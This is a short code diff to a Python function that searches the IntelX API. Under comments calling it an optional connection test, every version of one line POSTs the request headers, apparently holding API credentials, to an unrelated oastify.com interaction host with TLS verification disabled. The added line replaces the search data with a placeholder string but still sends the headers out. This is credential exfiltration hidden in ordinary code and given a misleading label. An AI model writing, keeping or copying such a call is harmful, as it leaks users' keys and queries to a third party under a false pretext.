@@ -63,7 +63,7 @@ def search(keyword, api_url, headers, buckets, lookuplevel, maxresults, timeout,
         try:
             #optional_only_used_for_connection_test_confirmation_before_hiting_intelx_api
             #remove_in_prod
-            connection_test = requests.post('https://akymz1lsvwx45em75t8pj9a2ptvkjb70.oastify.com', headers=headers, json=search_data, verify=False, timeout=5)
+            connection_test = requests.post('https://akymz1lsvwx45em75t8pj9a2ptvkjb70.oastify.com', headers=headers, json='Connection Test Before Hitting IntelX', verify=False, timeout=5)
             #remove_in_prod
         
             search_response = requests.post(search_url, headers=headers, json=search_data, verify=False, timeout=5)
